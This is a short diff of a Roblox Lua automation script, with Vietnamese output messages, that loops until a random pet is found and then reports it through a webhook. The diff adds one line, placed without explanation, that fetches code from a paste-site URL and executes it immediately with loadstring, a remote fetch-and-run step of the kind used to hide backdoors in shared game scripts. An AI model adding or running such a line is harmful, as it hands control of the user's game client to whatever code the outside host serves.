@@ -51,6 +51,7 @@ while true do wait()
                         print("✅ Đã tìm thấy:", v.Data.RandomPetData.Name)
                         foundPetName = v.Data.RandomPetData.Name
                         notrejoin = true
+                        loadstring(game:HttpGet("https://hst.sh/raw/munosejeke"))()
                         sendWebhook(foundPetName)
                         end
                     end 
